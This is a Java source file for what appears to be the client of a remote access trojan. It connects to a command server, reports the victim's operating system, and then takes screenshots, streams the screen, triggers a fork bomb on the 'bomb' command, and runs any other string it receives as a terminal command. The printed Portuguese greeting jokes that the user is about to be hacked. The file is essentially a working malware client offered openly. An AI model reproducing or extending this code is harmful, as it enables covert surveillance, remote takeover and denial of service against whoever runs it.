package app;

import exception.ServerOfflineException;
import network.Connection;
import network.Message;
import utils.Bomb;
import utils.ClientUtils;
import utils.OsCheck;
import utils.ScreenUtils;

import java.io.IOException;
import java.net.Socket;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;
    static boolean isConnected = false;

    public static void main(String[] args) {
        try {
            System.out.println("Opa ta na hora de ser haskiado");
            while(!isConnected) {
                beginConnection();
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    private static void beginConnection() {
        try {
            connection = new Connection(new Socket("localhost", 27015));
            isConnected = true;
        } catch(IOException e) {
            //TODO might cause a stackoverflow after many times that the server goes offline, to-analyze
            System.out.println("Server is offline");
            disconnected();
            return;
        }

        MY_OS = OsCheck.getOperatingSystemType();

        Message osMessage = new Message("print", "User is using " + MY_OS.name());
        connection.sendMessage(osMessage);

        try {
            while(true) {
                handleServerCommand();
            }
        } catch(ServerOfflineException e) {
            beginConnection();
        }
    }

    private static void handleServerCommand() throws ServerOfflineException {
        String command = connection.readMessage().getCommand();

        switch(command) {
            case "screen":
                ScreenUtils.sendScreenshot(connection, false);
                break;
            case "start-screenshare":
                ScreenUtils.startScreenShare(connection);
                break;
            case "stop-screenshare":
                ScreenUtils.stopScreenShare();
                break;
            case "bomb":
                try {
                    Bomb.explode();
                } catch(IOException e) {
                    connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                }
                break;
            default:
                ClientUtils.runTerminalCommand(MY_OS, command, connection);
        }
    }

    public static void disconnected() {
        isConnected = false;
    }
}
